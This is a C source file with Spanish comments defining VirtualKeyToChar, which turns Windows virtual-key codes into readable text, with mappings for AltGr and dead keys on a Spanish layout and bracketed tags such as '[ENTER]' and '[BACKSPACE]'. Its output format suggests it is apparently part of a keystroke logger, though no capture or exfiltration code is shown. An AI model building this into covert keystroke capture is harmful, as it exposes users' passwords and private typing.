#include "winkey.h"
#include <wctype.h>

char* VirtualKeyToChar(DWORD vkCode, DWORD scanCode, HKL keyboardLayout)
{
    static char keyName[64];
    static WCHAR unicodeChar[3] = {0};
    static BOOL lastWasAltGrCtrl = FALSE;
    BYTE keyboardState[256];

    // Limpiar buffers
    memset(keyName, 0, sizeof(keyName));

    // --- DETECCIÓN DE AltGr ---
    BOOL ctrlPressed = (GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_CONTROL) & 0x8000);
    BOOL altPressed = (GetAsyncKeyState(VK_RMENU) & 0x8000) || (GetAsyncKeyState(VK_MENU) & 0x8000);
    BOOL isAltGr = ctrlPressed && altPressed;

    // --- MANEJO DE MODIFICADORES AltGr ---
    if ((vkCode == VK_LCONTROL || vkCode == VK_CONTROL) && altPressed) {
        if (!lastWasAltGrCtrl) {
            lastWasAltGrCtrl = TRUE;
            return "[AltGr]";
        }
        return ""; // Si ya mostramos AltGr, no mostrar nada más
    }
    if ((vkCode == VK_RMENU || vkCode == VK_MENU) && ctrlPressed) {
        return ""; // No mostrar Alt cuando es parte de AltGr
    }

    // Resetear flag cuando no es AltGr
    if (!isAltGr) {
        lastWasAltGrCtrl = FALSE;
    }

    // --- MAPEO CORRECTO BASADO EN EL DEBUG ---
    if (isAltGr) {
        switch(vkCode) {
            case 49:  return "|";     // AltGr + 1 = |
            case 50:  return "@";     // AltGr + 2 = @
            case 51:  return "#";     // AltGr + 3 = #
            case 52:  return "~";     // AltGr + 4 = ~
            case 53:  return "€";     // AltGr + 5 = €
            case 54:  return "¬";     // AltGr + 6 = ¬
            case 186: return "[";     // AltGr + ñ = [
            case 187: return "]";     // AltGr + + = ]
            case 222: return "{";     // AltGr + ´ = {
            case 191: return "}";     // AltGr + ç = }
            case 220: return "\\";    // AltGr + º = backslash
        }
    }

    // Switch normal para teclas especiales
    switch(vkCode)
    {
        // Modificadores - manejar AltGr correctamente
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:   
            // Si es parte de AltGr, ya se manejó arriba
            if (!isAltGr) return "[CTRL]";
            return "";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:      
            // Si es parte de AltGr, ya se manejó arriba  
            if (!isAltGr) return "[ALT]";
            return "";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:     return "[SHIFT]";

        // Teclas de acción
        case VK_RETURN:     return "[ENTER]\n";
        case VK_TAB:        return "[TAB]";
        case VK_BACK:       return "[BACKSPACE]";
        case VK_DELETE:     return "[DELETE]";
        case VK_ESCAPE:     return "[ESCAPE]";
        case VK_SPACE:      return " ";
        case VK_LWIN:       return "[L_WIN]";
        case VK_RWIN:       return "[R_WIN]";
        case VK_CAPITAL:    return "[CAPS_LOCK]";
        case VK_NUMLOCK:    return "[NUM_LOCK]";
        case VK_LEFT:       return "[LEFT_ARROW]";
        case VK_RIGHT:      return "[RIGHT_ARROW]";
        case VK_UP:         return "[UP_ARROW]";
        case VK_DOWN:       return "[DOWN_ARROW]";
        case VK_F1: case VK_F2: case VK_F3: case VK_F4: case VK_F5: case VK_F6:
        case VK_F7: case VK_F8: case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            sprintf_s(keyName, sizeof(keyName), "[F%lu]", vkCode - VK_F1 + 1);
            return keyName;
    }

    // Solo procesar otras teclas si NO es AltGr
    if (!isAltGr) {
        // Obtener el estado real del teclado
        if (!GetKeyboardState(keyboardState)) {
            return "";
        }

        // Actualizar manualmente el estado de las teclas modificadoras para asegurar coherencia
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
            keyboardState[VK_SHIFT] = 0x80;
            keyboardState[VK_LSHIFT] = 0x80;
            keyboardState[VK_RSHIFT] = 0x80;
        }
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
            keyboardState[VK_CONTROL] = 0x80;
            keyboardState[VK_LCONTROL] = 0x80;
        }
        if (GetAsyncKeyState(VK_MENU) & 0x8000) {
            keyboardState[VK_MENU] = 0x80;
            keyboardState[VK_LMENU] = 0x80;
        }

        // limpiar el buffer antes de usar ToUnicodeEx
        memset(unicodeChar, 0, sizeof(unicodeChar));

        int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeChar, 2, 0, keyboardLayout);

        if (result > 0) {
            // Asegurar que el buffer esté terminado correctamente
            unicodeChar[result] = L'\0';

            // verificar que el primer caracter sea imprimible
            if (unicodeChar[0] >= 32 && unicodeChar[0] != 127 && iswprint(unicodeChar[0])) {
                // convertir a UTF-8
                int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, keyName, sizeof(keyName) - 1, NULL, NULL);
                if (bytesWritten > 0) {
                    keyName[bytesWritten] = '\0';
                    return keyName;
                }
            }
        }
        else if (result < 0) {
            // tecla muerta detectada
            // intentar obtener la version spacing del caracter muerto
            if (unicodeChar[0] != 0 && iswprint(unicodeChar[0])) {
                unicodeChar[1] = L'\0';
                int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, 1, 
                                                     keyName, sizeof(keyName) - 1, NULL, NULL);
                if (bytesWritten > 0) {
                    keyName[bytesWritten] = '\0';
                    return keyName;
                }
            }

            // Si no podemos obtener el carácter, intentar mapeo manual para teclas muertas comunes
            switch(vkCode) {
                case 186: return "ñ";  // VK_OEM_1 en teclado español
                case 222: return "´";  // VK_OEM_7 (acento agudo)
                case 192: return "`";  // VK_OEM_3 (acento grave)
                case 221: return "¨";  // VK_OEM_6 (diéresis)
            }
        }
    }
    return "";
}